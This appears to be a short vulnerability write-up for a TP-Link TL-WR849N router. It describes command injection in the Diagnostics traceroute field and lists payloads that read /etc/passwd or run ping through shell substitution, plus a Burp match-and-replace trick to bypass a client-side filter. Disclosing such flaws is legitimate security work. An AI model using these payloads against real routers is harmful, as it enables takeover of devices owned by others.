# TP LINK TL-WR849N - REMOTE COMMAND EXECUTION PoC

 ![replace](/src/rce.png)
 
[Poc - RCE-TLWR849N.py](/tp-link/RCE-TLWR849N.py)


## Model 
   0.9.1 4.16 v004c.0 Build 180628 Rel.54314n(4252)

## Download 
  https://www.tp-link.com/br/support/download/tl-wr849n/#Firmware
  
## Vuln
  The vulnerability is present in the Diagnostics area of the router, where it is possible to perform ping and tracerout tests.
## Exploiting
  In the "Tracerout" input we will send the payload to bypass the filter and get the RCE.
  
**Payloads**
 ```Bash
  "$(cat /etc/passwd)"
  "`cat /etc/passwd`"
  ;`ping host.com`
 ```
 
 #### If the page has a filter that doesn't allow special characters, we can circumvent it with Burp.
 ![replace](/src/replace.png)

Math/replace > Response Body

Math: window.location.href="http://192.168.21.1";

Replace: alert('injected');
